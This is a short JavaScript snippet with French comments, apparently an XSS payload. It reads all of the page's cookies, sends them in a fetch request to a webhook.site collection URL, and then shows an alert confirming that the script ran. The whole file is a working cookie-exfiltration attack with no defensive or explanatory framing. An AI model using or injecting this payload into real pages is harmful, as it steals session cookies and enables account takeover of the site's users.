(function() {
    // Récupère tous les cookies
    const cookies = document.cookie;
    
    // Crée l'URL avec les cookies en paramètre
    const url = 'https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f?cookies=' + encodeURIComponent(cookies);
    
    // Envoie les cookies via une requête fetch
    fetch(url, {
        method: 'GET',
        mode: 'no-cors'
    })
    .then(() => {
        console.log('Script exécuté avec succès - Cookies envoyés');
        alert('Le script a été correctement mis en place et exécuté !');
    })
    .catch(error => {
        console.error('Erreur:', error);
    });
})();
